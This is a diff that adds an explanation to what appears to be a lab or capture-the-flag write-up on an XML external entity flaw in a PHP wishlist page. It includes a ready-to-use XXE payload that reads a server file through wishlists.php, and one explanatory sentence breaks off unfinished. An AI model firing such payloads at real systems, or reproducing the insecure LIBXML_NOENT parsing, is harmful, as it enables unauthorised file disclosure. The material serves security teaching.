@@ -64,6 +64,23 @@ $wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);
 ..
 echo "Item added to your wishlist successfully.";
 ?>
+
+```
+
+When a user sends specially crafted XML data to the application, the line `libxml_disable_entity_loader(false)` allows the XML parser to load external entities. This means the XML input can include external file references or requests to remote servers. When the XML is processed by `simplexml_load_string` with the `LIBXML_NOENT` option, the web app resolves external entities, allowing 
+
+inject this payload in the `wishlists.php` request 
+**Note: Not all web applications use the path /var/www/html, but web servers typically use it.**
+
+```javascript
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
+<wishlist>
+	<user_id>1</user_id>
+	<item>
+	       <product_id>&payload;</product_id>
+	</item>
+</wishlist>
 ```
 
 ### References
